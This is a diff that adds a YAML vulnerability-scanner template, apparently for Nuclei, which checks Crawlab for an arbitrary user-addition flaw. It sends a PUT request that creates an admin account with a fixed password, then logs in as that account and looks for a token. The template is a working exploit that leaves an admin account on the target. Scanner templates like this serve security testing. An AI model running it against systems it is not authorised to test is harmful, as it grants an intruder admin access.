@@ -1,0 +1,46 @@
+id: poc-yaml-crawlab-users-add
+info:
+  name: Crawlab Arbitrary User Addition Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: privilege-bypass
+
+variables:
+  t1: '{{rand_int(100, 1000)}}'
+
+http:
+  - id: create-user
+    method: PUT
+    path:
+      - '{{BaseURL}}/api/users'
+    body: |
+      {"username":"test{{t1}}","password":"test123","role":"admin","email":"test123@qq.com"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - '"status":"ok"'
+          - '"success"'
+
+  - id: login-user
+    method: POST
+    path:
+      - '{{BaseURL}}/api/login'
+    body: |
+      {"username":"test{{t1}}","password":"test123"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - '"status":"ok"'
+          - '"success"'
+          - '"data"'
+      - type: regex
+        regex:
+          - '\b[\w-]+\.[\w-]+\.[\w-]+\b'
